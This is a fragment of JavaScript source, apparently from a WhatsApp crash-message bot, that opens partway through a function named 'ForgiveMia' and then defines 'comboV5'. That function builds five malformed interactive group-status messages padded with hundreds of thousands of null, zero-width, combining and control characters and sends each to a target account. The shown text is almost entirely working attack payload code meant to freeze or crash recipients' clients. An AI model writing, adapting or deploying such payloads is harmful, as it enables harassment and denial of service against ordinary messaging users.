                            buttons: Array.from({ length: 500000 }, () => ({}))
                        }
                    }
                }
            }
        }, {
            noSelfSync: true,
            messageId: `MIA_${Date.now()}`
        });
    } catch (e) {
        console.error("ForgiveMia Error:", e.message);
    }
}


async function comboV5(sock, target) {
    const msg = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "\u200C".repeat(20000),
                        format: "DEFAULT"
                    },
                    nativeFlowMessage: {
                        buttons: "\u0000".repeat(100000),
                        encryptedParams: {
                            value: "\u2066".repeat(20000),
                        },
                    },
                },
            }
        }
    };

    const msg2 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "KingMirulZyyzz" +
                            "\u0300".repeat(15000) +
                            "\u0000" +
                            "\uE0020".repeat(10000),
                        format: "DEFAULT"
                    },
                    nativeFlowMessage: {
                        buttons: "name_comunity_maessage".repeat(20000),
                    },
                },
            }
        }
    };

    const msg3 = {
        groupStatusMessageV2: {
            message: {
                extendedTextMessage: {
                    text: "KingMirulZyyzz",
                    contextInfo: {
                        mentionedJid: ["628123456789@s.whatsapp.net"],
                        quotedMessage: {
                            interactiveMessage: {
                                body: {
                                    text: "\u0000".repeat(60000) + "\u200b".repeat(20000) + "\u600b".repeat(20000)
                                },
                                nativeFlowMessage: {
                                    buttons: "\u001A".repeat(300000)
                                }
                            }
                        }
                    }
                }
            }
        }
    };

    const msg4 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "\x2134".repeat(60000),
                        format: "DEFAULT"
                    },
                    nativeFlowMessage: {
                        buttons: "lock_call_message".repeat(20000) + "\u200B".repeat(200000)
                    }
                }
            }
        }
    };

    const msg5 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "\x10".repeat(60000) + "\u0923".repeat(30000),
                        format: "DEFAULT"
                    },
                    nativeFlowMessage: {
                        buttons: "long_message".repeat(20000) + "\u200B".repeat(200000)
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, msg, { noSelfSync: true });
    await sock.relayMessage(target, msg2, { noSelfSync: true });
    await sock.relayMessage(target, msg3, { noSelfSync: true });
    await sock.relayMessage(target, msg4, { noSelfSync: true });
    await sock.relayMessage(target, msg5, { noSelfSync: true });
}
//============( END ) =======\\
bot.launch()